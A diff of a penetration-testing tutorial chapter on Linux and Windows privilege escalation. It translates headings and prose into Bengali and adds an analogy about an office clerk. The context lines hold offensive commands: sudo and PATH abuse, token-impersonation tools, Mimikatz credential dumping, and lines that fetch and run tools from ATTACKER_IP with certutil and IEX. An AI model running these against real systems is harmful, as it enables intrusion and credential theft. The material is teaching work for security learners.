@@ -1,9 +1,9 @@
 ---
 title: 'Privilege Escalation'
-subtitle: 'Linux and Windows privesc techniques — SUID binaries, sudo misconfigs, kernel exploits, service account abuse, token impersonation.'
+subtitle: 'Linux ও Windows privesc কৌশল — SUID binary, sudo misconfig, kernel exploit, service account অপব্যবহার, token impersonation।'
 chapter: 9
 level: 'intermediate'
-readingTime: '16 min'
+readingTime: '16 মিনিট'
 topics:
   [
     'privilege escalation',
@@ -22,15 +22,23 @@ topics:
 
 <Callout type="info">
 
-**Real-World Analogy**
+**বাস্তব জীবনের উদাহরণ**
 
-Getting a shell as a low-privilege user is like getting a visitor badge — you're in the building but can't access the server room. Privilege escalation is finding the key card someone left in an unlocked desk drawer.
+low-privilege ইউজার হিসেবে shell পাওয়া অনেকটা একটা visitor badge পাওয়ার মতো — আপনি বিল্ডিংয়ে ঢুকেছেন ঠিকই, কিন্তু server room-এ যেতে পারছেন না। Privilege escalation হলো কারো খোলা ড্রয়ারে ফেলে রাখা key card খুঁজে পাওয়া।
 
 </Callout>
 
-## The Privesc Mindset
+## গল্পে বুঝি
 
-Never assume you're stuck at low privilege. Privesc is methodical enumeration:
+আল-খোয়ারিজমি একটা বড় অফিসের junior clerk। তার কাজ নির্দিষ্ট — সামনের ডেস্কে বসে ফাইল এন্ট্রি করা, নিজের কেবিনেটটুকু খোলা-বন্ধ করা। ম্যানেজারের ঘর, স্ট্রংরুম, সার্ভার রুম — এসব জায়গায় তার ঢোকার অনুমতি নেই। একদিন কাজের ফাঁকে সে খেয়াল করল, ম্যানেজার ইবনে সিনা তাড়াহুড়োয় নিজের ড্রয়ার লক না করেই বেরিয়ে গেছেন, আর ভেতরে পড়ে আছে গোটা বিল্ডিংয়ের master key। ড্রয়ারের গায়ে সাঁটানো একটা sticky note-এ সাদা চোখে লেখা safe-এর কোড।
+
+এই master key দিয়ে আল-খোয়ারিজমি এখন যেকোনো দরজা খুলতে পারে, safe-এর কোড দিয়ে টাকার ভল্টও। সে চালাক বলে নয়, বরং permission hygiene নষ্ট বলেই হঠাৎ সেই junior clerk পুরো বিল্ডিংয়ের হর্তাকর্তা বনে গেল — যেখানে তার আসলে সামান্য একটা ডেস্কের বেশি কিছুতে হাত দেওয়ার কথাই ছিল না।
+
+এই গল্পটাই আসলে **privilege escalation**। junior clerk-এর সীমিত access হলো একটা low-privilege foothold — attacker সিস্টেমে ঢুকেছে ঠিকই, কিন্তু সাধারণ ইউজার হিসেবে। খোলা ড্রয়ারে পড়ে থাকা master key আর sticky note-এর কোড হলো একটা misconfigured permission আর ফেলে রাখা credential। আর সেগুলো কাজে লাগিয়ে গোটা বিল্ডিংয়ের নিয়ন্ত্রণ নেওয়াটাই root/admin-এ escalate করা — low থেকে high privilege-এ ওঠা। ভুলটা attacker চালাক বলে নয়, ভুলটা ছিল ঢিলেঢালা permission hygiene — শক্তিশালী key যেখানে-সেখানে ফেলে রাখা, দরকারের চেয়ে বেশি access খোলা রাখা। এর ঠিক প্রতিরোধই হলো **least privilege** (প্রত্যেকে ঠিক ততটুকু access পাবে যতটুকু কাজে লাগে, এক চুলও বেশি নয়) আর টানটান permission hygiene — শক্তিশালী key তালাবদ্ধ রাখা, credential কোথাও ফেলে না রাখা। বাস্তবেও তাই: বেশিরভাগ privesc ভয়ংকর কোনো zero-day দিয়ে হয় না, হয় sudo-র ঢিলেঢালা config, world-writable ফাইল, কিংবা config বা history-তে পড়ে থাকা password-এর মতো তুচ্ছ ভুল থেকে।
+
+## Privesc Mindset
+
+কখনো ধরে নেবেন না যে আপনি low privilege-এ আটকে গেছেন। Privesc হলো পদ্ধতিগত enumeration:
 
 ```
 1. Gather system info — OS version, kernel, architecture
@@ -46,7 +54,7 @@ Never assume you're stuck at low privilege. Privesc is methodical enumeration:
 
 ## Linux Privilege Escalation
 
-### Initial Enumeration
+### প্রাথমিক Enumeration
 
 ```bash
 # System info
@@ -75,7 +83,7 @@ cat ~/.ssh/known_hosts   # what hosts does this user connect to?
 ls ~/.ssh/                # any private keys?
 ```
 
-### sudo Misconfigurations
+### sudo Misconfiguration
 
 ```bash
 sudo -l
@@ -93,7 +101,7 @@ User user may run the following commands:
     (root) NOPASSWD: /usr/bin/awk
 ```
 
-**GTFOBins** (`gtfobins.github.io`) — documents sudo/SUID escalation for hundreds of binaries:
+**GTFOBins** (`gtfobins.github.io`) — শত শত binary-র জন্য sudo/SUID escalation ডকুমেন্ট করে:
 
 ```bash
 # vim as sudo
@@ -201,9 +209,9 @@ export PATH=/tmp:$PATH
 sudo backup.sh   # runs your /tmp/cp as root
 ```
 
-### Kernel Exploits
+### Kernel Exploit
 
-Last resort — unstable, may crash the system:
+শেষ উপায় — অস্থিতিশীল, সিস্টেম ক্র্যাশ করতে পারে:
 
 ```bash
 # Find kernel version
@@ -240,7 +248,7 @@ chmod +x pspy64 && ./pspy64
 
 ## Windows Privilege Escalation
 
-### Initial Enumeration
+### প্রাথমিক Enumeration
 
 ```powershell
 # System info
@@ -267,7 +275,7 @@ netstat -ano         # active connections with PIDs
 schtasks /query /fo LIST /v
 ```
 
-### Unquoted Service Paths
+### Unquoted Service Path
 
 ```powershell
 # Find unquoted service paths
@@ -305,7 +313,7 @@ msiexec /quiet /qn /i shell.msi
 
 ### Token Impersonation
 
-Windows tokens represent identity. Certain privileges allow stealing tokens from privileged processes:
+Windows token পরিচয়কে (identity) প্রতিনিধিত্ব করে। কিছু নির্দিষ্ট privilege থাকলে privileged process থেকে token চুরি করা সম্ভব:
 
 ```powershell
 # Check privileges
@@ -330,7 +338,7 @@ JuicyPotato.exe -l 4444 -p c:\windows\system32\cmd.exe -t * -c {CLSID}
 RoguePotato.exe -r 192.168.1.50 -e "cmd.exe" -l 9999
 ```
 
-### Credential Dumping with Mimikatz
+### Mimikatz দিয়ে Credential Dumping
 
 ```powershell
 # Mimikatz — extract Windows credentials from memory
@@ -369,7 +377,7 @@ certutil -urlcache -f http://ATTACKER_IP:8000/winPEASx64.exe winpeas.exe
 IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8000/winPEAS.ps1')
 ```
 
-## Real Project: HackTheBox — Basic Privesc Path
+## বাস্তব প্রজেক্ট: HackTheBox — Basic Privesc Path
 
 ```bash
 # Typical HTB Linux machine flow:
